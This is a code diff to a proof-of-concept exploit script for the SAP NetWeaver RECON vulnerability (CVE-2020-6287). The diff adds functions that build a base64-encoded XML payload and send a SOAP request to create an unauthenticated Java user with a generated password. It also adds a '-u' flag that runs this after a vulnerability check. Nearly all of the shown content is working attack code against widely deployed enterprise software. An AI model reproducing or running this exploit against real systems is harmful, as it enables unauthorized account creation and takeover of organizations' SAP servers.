@@ -9,7 +9,7 @@ import argparse
 import xml.etree.ElementTree as ET
 
 help_desc = '''
-PoC for CVE-2020-6287, CVE-2020-6286 (RECON)
+PoC for CVE-2020-6287,  (RECON)
 This scrip allows to check SAP LM Configuration Wizard missing authorization check vulnerability and exploits dir traversal in queryProtocol method
 Original finding: 
 - Pablo Artuso. https://twitter.com/lmkalg
@@ -98,6 +98,43 @@ def exploit_traversal(url, zipfile):
         print("Error! Can't read file %s. Status: %s" % (zipfile, ans.status_code))
     return
 
+def generate_CreateUser_paylod():
+    username = "sapRpoc%d" % (random.randint(5000, 10000))
+    password = "Secure!PwD%d" % (random.randint(5000, 10000))
+    p = "<root><user><JavaOrABAP>java</JavaOrABAP><username>%s</username><password>%s</password><userType>J</userType></user></root>" % (username, password)
+    print("Going to create new user. %s:%s" % (username, password))
+    return base64.b64encode(p)
+
+def exploit_createUser(url):
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0 CVE-2020-6287 PoC",
+        "Content-Type": "text/xml;charset=UTF-8"}
+    payload = generate_CreateUser_paylod()
+    xml = '''
+            <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
+               <soapenv:Header/>
+               <soapenv:Body>
+                  <urn:executeSynchronious>
+                     <identifier>
+                        <component>sap.com/tc~lm~config~content</component>
+                        <path>content/Netweaver/ASJava/NWA/SPC/SPC_UserManagement.cproc</path>
+                        <type></type>
+                     </identifier>
+                     <contextMessages>
+                        <baData>
+                        %s</baData>
+                        <name>userDetails</name>
+                     </contextMessages>
+                  </urn:executeSynchronious>
+               </soapenv:Body>
+            </soapenv:Envelope>
+        ''' % (payload)
+    ans = requests.post(url, headers=headers, timeout=timeout, data=xml, verify=False)
+    if ans.status_code == 200:
+        print("Ok! User were created")
+    else:
+        print("Error! Can't create user. Status: %s" % (ans.status_code))
+    return
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
@@ -106,6 +143,7 @@ if __name__ == '__main__':
     parser.add_argument('-s', '--ssl', action='store_true', help='enable SSL')
     parser.add_argument('-c', '--check', action='store_true', help='just detect vulnerability')
     parser.add_argument('-f', '--zipfile', default='', help='ZIP file to read. CVE-2020-6286')
+    parser.add_argument('-u', '--user', action='store_true', help='Create JAVA user. CVE-2020-6287')
     parser.add_argument('--timeout', default=10, type=int, help='HTTP connection timeout in second (default: 10)')
     parser.add_argument('-v', '--verbose', action='store_true', help='verbose mode')
     args = parser.parse_args()
@@ -122,5 +160,8 @@ if __name__ == '__main__':
         result = detect_vuln(base_url)
         if result["status"]:
             exploit_traversal(result["url"].replace("?wsdl",""),args.zipfile)
-
+    if args.user:
+        result = detect_vuln(base_url)
+        if result["status"]:
+            exploit_createUser(result["url"].replace("?wsdl", ""))
 
